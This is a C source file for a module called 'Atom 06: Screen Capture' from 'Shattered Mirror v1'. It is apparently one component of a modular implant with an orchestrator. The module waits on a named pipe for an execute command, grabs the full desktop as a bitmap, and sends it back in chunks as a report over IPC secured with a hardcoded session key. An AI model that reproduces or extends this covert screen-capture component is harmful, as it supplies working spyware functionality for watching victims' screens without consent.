/*=============================================================================
 * Shattered Mirror v1 — Atom 06: Screen Capture
 *
 * Implements GDI+ or pure GDI screen capture. For MVP we use pure GDI to DIB section 
 * to avoid initializing the GDI+ subsystem cleanly within a thread, keeping it smaller.
 *===========================================================================*/

#include "Atom_06_Screen.h"
#include "../Orchestrator/AtomManager.h"

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

/* Helper to capture screen to raw BMP memory */
static BOOL CaptureScreenToMemory(BYTE** ppBmpData, DWORD* pdwSize) {
    int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
    
    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
    SelectObject(hCaptureDC, hCaptureBitmap);
    
    /* Blit */
    BitBlt(hCaptureDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, 0, 0, SRCCOPY);

    /* Get DIB specifics */
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = nScreenWidth;
    bmi.bmiHeader.biHeight = -nScreenHeight; /* top-down */
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    DWORD dwBmpSize = ((nScreenWidth * bmi.bmiHeader.biBitCount + 31) / 32) * 4 * nScreenHeight;
    DWORD dwFullSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;

    *ppBmpData = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFullSize);
    if (!*ppBmpData) {
        DeleteObject(hCaptureBitmap);
        DeleteDC(hCaptureDC);
        ReleaseDC(hDesktopWnd, hDesktopDC);
        return FALSE;
    }

    BITMAPFILEHEADER* bmfHeader = (BITMAPFILEHEADER*)*ppBmpData;
    bmfHeader->bfType = 0x4D42; /* "BM" */
    bmfHeader->bfSize = dwFullSize;
    bmfHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    memcpy(*ppBmpData + sizeof(BITMAPFILEHEADER), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));

    GetDIBits(hCaptureDC, hCaptureBitmap, 0, nScreenHeight, 
              *ppBmpData + bmfHeader->bfOffBits, &bmi, DIB_RGB_COLORS);

    *pdwSize = dwFullSize;

    DeleteObject(hCaptureBitmap);
    DeleteDC(hCaptureDC);
    ReleaseDC(hDesktopWnd, hDesktopDC);

    return TRUE;
}

DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "YiZZCxy3SLMsIdhN";

    while (TRUE) {
        IPC_MESSAGE inMsg = { 0 };
        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                BYTE* pBmpData = NULL;
                DWORD dwBmpSize = 0;

                if (CaptureScreenToMemory(&pBmpData, &dwBmpSize)) {
                    DWORD offset = 0;
                    while (offset < dwBmpSize) {
                        DWORD chunk = dwBmpSize - offset;
                        if (chunk > MAX_IPC_PAYLOAD_SIZE) chunk = MAX_IPC_PAYLOAD_SIZE;

                        IPC_MESSAGE msg = { 0 };
                        msg.CommandId = CMD_REPORT;
                        msg.dwPayloadLen = chunk;
                        memcpy(msg.Payload, pBmpData + offset, chunk);

                        IPC_SendMessage(hPipe, &msg, SharedSessionKey, 16);
                        offset += chunk;
                        Sleep(1);
                    }
                    if (pBmpData) HeapFree(GetProcessHeap(), 0, pBmpData);
                }
            }
        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
        Sleep(500);
    }
    return 0;
}
